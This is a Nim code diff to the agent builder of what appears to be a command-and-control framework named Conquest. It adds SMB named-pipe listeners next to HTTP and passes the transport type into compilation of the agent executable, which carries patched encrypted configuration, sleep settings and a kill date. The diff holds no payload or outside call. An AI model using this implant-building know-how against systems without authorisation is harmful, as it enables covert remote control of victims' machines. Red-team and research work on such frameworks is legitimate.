@@ -16,7 +16,12 @@ proc serializeConfiguration(cq: Conquest, listener: Listener, sleepSettings: Sle
 
     # Listener configuration
     packer.add(string.toUuid(listener.listenerId))
-    packer.addDataWithLengthPrefix(string.toBytes(listener.hosts))
+
+    case listener.listenerType:
+    of LISTENER_HTTP:
+        packer.addDataWithLengthPrefix(string.toBytes(listener.hosts))
+    of LISTENER_SMB: 
+        packer.addDataWithLengthPrefix(string.toBytes(listener.pipe))
 
     # Sleep settings
     packer.add(sleepSettings.sleepDelay)
@@ -63,15 +68,16 @@ proc serializeConfiguration(cq: Conquest, listener: Listener, sleepSettings: Sle
 
     return encMaterial & encData 
 
-proc replaceAfterPrefix(content, prefix, value: string): string = 
+proc replaceAfterPrefix(content, prefix, value: string, quoted: bool = false): string = 
     result = content.splitLines().mapIt(
         if it.startsWith(prefix):
-            prefix & '"' & value & '"' 
+            if quoted: prefix & '"' & value & '"' 
+            else: prefix & value
         else: 
             it
     ).join("\n")
     
-proc compile(cq: Conquest, placeholderLength: int, modules: uint32, verbose: bool): string = 
+proc compile(cq: Conquest, placeholderLength: int, modules: uint32, verbose: bool, listenerType: ListenerType): string = 
     
     let 
         configFile = fmt"{CONQUEST_ROOT}/src/agent/nim.cfg"  
@@ -85,10 +91,11 @@ proc compile(cq: Conquest, placeholderLength: int, modules: uint32, verbose: boo
     # Update placeholder and configuration values 
     let placeholder = PLACEHOLDER & "A".repeat(placeholderLength - (2 * len(PLACEHOLDER))) & PLACEHOLDER
     var config = readFile(configFile)
-                    .replaceAfterPrefix("-d:CONFIGURATION=", placeholder)    
-                    .replaceAfterPrefix("-o:", exeFile)
+                    .replaceAfterPrefix("-d:CONFIGURATION=", placeholder, quoted = true)    
+                    .replaceAfterPrefix("-o:", exeFile, quoted = true)
                     .replaceAfterPrefix("-d:MODULES=", $modules)
                     .replaceAfterPrefix("-d:VERBOSE=", $verbose)
+                    .replaceAfterPrefix("-d:TRANSPORT_", $listenerType)
     writeFile(configFile, config)
 
     cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
@@ -169,7 +176,7 @@ proc agentBuild*(cq: Conquest, agentBuildInformation: AgentBuildInformation): se
     
     var config = cq.serializeConfiguration(listener, agentBuildInformation.sleepSettings, agentBuildInformation.killDate)
     
-    let unpatchedExePath = cq.compile(config.len(), agentBuildInformation.modules, agentBuildInformation.verbose)
+    let unpatchedExePath = cq.compile(config.len(), agentBuildInformation.modules, agentBuildInformation.verbose, listener.listenerType)
     if unpatchedExePath.isEmptyOrWhitespace():
         return 
 
